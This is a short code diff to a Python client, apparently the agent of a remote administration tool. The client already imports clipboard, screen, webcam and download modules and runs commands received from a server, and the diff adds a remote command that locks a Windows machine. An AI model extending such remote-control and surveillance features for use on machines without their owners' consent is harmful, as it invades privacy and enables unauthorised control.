@@ -5,7 +5,7 @@ from contextlib import redirect_stdout, suppress
 from io import StringIO
 
 from cryptography import x509
-from modules import clipboard, download, screen, webcam
+from modules import clipboard, download, screen, webcam, windows
 from utils.baseclient import BaseClient
 
 logging.basicConfig(level=logging.DEBUG)
@@ -41,6 +41,8 @@ class Client(BaseClient):
                 self.receive_file()
             case 'DOWNLOAD':
                 self.download()
+            case 'LOCK':
+                self.lock()
             case _:
                 logging.debug('Received unrecognized command: %s' % command)
 
@@ -172,6 +174,22 @@ class Client(BaseClient):
         else:
             logging.info("Saved downloaded file from '%s' as '%s'" % (url, filename))
             self.write(b'Success')
+
+    def lock(self) -> None:
+        """ Lock Machine (Windows only) """
+        logging.debug("Attempting to lock machine")
+
+        try:
+            windows.lock()
+        except OSError as error:
+            logging.error("Could not lock machine: %s" % str(error))
+            self.write(str(error).encode())
+        else:
+            logging.info("Locked machine")
+            self.write(b'LOCKED')
+
+
+        
 
 
 if __name__ == '__main__':
